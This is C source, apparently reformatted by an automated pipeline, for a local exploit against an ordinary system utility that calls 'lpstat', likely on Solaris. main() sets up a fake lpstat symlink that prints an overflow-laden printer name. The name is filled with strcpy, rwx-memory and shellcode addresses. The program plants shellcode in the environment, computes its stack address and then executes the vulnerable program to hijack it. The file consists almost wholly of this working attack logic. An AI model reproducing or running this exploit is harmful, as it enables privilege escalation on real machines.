#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  release ;
typedef  int /*<<< orphan*/  platform ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 int BUFSIZE ; 
 char* INFO1 ; 
 char* INFO2 ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 int /*<<< orphan*/  SI_RELEASE ; 
 char* VULN ; 
 int /*<<< orphan*/  add_env (char*) ; 
 char** env ; 
 int env_len ; 
 int env_pos ; 
 int /*<<< orphan*/  execve (char*,char**,char**) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  getenv (char*) ; 
 int /*<<< orphan*/  memset (char*,char,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,char*) ; 
 char* sc ; 
 int search_ldso (char*) ; 
 int search_rwx_mem () ; 
 int /*<<< orphan*/  set_val (char*,int,int) ; 
 int /*<<< orphan*/  sprintf (char*,char*,...) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strcmp (char*,char*) ; 
 int strlen (char*) ; 
 scalar_t__ strtoul (int /*<<< orphan*/ ,char**,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  symlink (char*,char*) ; 
 int /*<<< orphan*/  sysinfo (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  unlink (char*) ; 

int main(int argc, char **argv)
{
	char	buf[BUFSIZE], ksh_var[16];
	char	platform[256], release[256], display[256];
	int	i, offset, sc_addr, ksh_pos;
	int	plat_len, prog_len;

	char	*arg[2] = {"foo", NULL};
	int	sb = ((int)argv[0] | 0xfff);	/* stack base */
	int	ret = search_ldso("strcpy");	/* or sprintf */
	int	rwx_mem = search_rwx_mem();	/* rwx memory */

	/* fake lpstat code */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* get the shellcode address from the environment */
		sc_addr = (int)strtoul(getenv("KSH"), (char **)NULL, 0);

		/* prepare the evil printer name */
		memset(buf, 'A', sizeof(buf));
		buf[sizeof(buf) - 1] = 0x0;

		/* fill with ld.so.1 address, saved eip, and arguments */
		for (i = 0; i < BUFSIZE; i += 4) {
			set_val(buf, i, ret);		/* strcpy */
			set_val(buf, i += 4, rwx_mem);	/* saved eip */
			set_val(buf, i += 4, rwx_mem);	/* 1st argument */
			set_val(buf, i += 4, sc_addr);	/* 2nd argument */
		}

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for %s: /dev/null\n", buf);
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: %s\n", buf);
		}
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);

	/* fill the envp, keeping padding */
	add_env(sc);
	ksh_pos = env_pos;
	add_env("KSH=0x42424242");
	add_env(display);
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the offset to the shellcode */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = 5 + env_len + plat_len + prog_len;

	/* calculate the shellcode address */
	sc_addr = sb - offset;

	/* overwrite the KSH env var with the right address */
	sprintf(ksh_var, "KSH=0x%x", sc_addr);
	env[ksh_pos] = ksh_var;

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}